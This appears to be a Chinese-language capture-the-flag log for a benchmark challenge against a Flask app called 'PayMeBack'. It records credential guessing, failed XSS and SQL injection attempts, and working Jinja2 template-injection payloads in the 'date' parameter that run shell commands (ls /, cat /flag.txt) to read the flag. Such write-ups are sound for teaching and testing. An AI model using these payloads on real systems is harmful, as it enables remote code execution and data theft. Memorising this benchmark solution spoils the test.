# xben-093-24 · 探索记录

对应题解：[`xben-093-24.md`](./xben-093-24.md)

## 目标与起点

`10.0.172.218:5003`，PayMeBack（Flask）。登录页只有 username/password，没有注册。

## 第一阶段：找可用账号

| 凭据 | 结果 |
| --- | --- |
| `admin:admin` / `admin:password` / `test:test` | `Invalid credentials` |
| `user:user` | 302 → `/transactions` |

## 第二阶段：翻功能

- `/transactions`：表格（Name/Email/Amount），每行一个「Remind」按钮
- `/add_transaction`：`name/email/amount`，存进去后 name 被 HTML 转义
- `/remind?date=YYYY-MM-DD`：显示「Reminder will be sent on <date>」

前端对 `date` 的正则只在前端生效。

## 第三阶段：模板注入

| date | 结果 |
| --- | --- |
| `{{7*7}}` | `Reminder will be sent on 49` |
| `{{ cycler...os.popen('ls /').read() }}` | 列出根目录 |
| `{{ config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read() }}` | **flag** |

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `name=<script>` | 被转义 | 页面里是 `&lt;script&gt;` |
| `date` 走 SQLi / 时间盲注 | 无信号 | 页面只回显日期字符串 |
| 登录 SQLi / 数组参数 | 只回 1783 字节登录页 | 与错误文案一致 |

## 这次真正的收获

1. 前端正则/`match` 只是 UX，直接发请求即可跳过。
2. 同一页面多个用户输入，要分别试：有的转义、有的进模板。
